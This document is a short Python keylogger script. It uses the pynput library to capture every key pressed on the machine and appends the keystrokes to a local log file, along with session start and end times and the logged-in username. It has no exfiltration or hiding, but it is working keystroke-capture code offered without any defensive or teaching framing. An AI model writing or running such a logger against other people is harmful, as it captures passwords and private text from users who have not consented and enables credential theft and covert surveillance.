from pynput import keyboard
import os
from datetime import datetime
import signal
time = datetime.now()
formatted_time = time.strftime("%Y-%m-%d %H:%M:%S")
user = os.getlogin()
file = open("logs.cvs", "a")
file.write("\n\t\t\t\t\t\t-Started seesion at " + formatted_time + "by the user " + user + "-\n\n" )
def on_press(key):
    try:
        
        file.write(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            file.write(" ")
        elif key == keyboard.Key.enter:
            file.write("\n")
    file.flush()
def handler(signum, frame):
    yes_no = input("Do you want to exit? (y/n): ")
    if yes_no == "y":
        print("Exiting...")
        date = datetime.now()
        formatted_date = date.strftime("%Y-%m-%d %H:%M:%S")
        file.write("\n\t\t\t\t\t\t-Ended session at " + formatted_date + ", by the user " + user + "-\n\n" )
        file.close()
        exit(0)
    else:
        print("Continuing...")
signal.signal(signal.SIGINT, handler)
signal.signal(signal.SIGTERM, handler)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()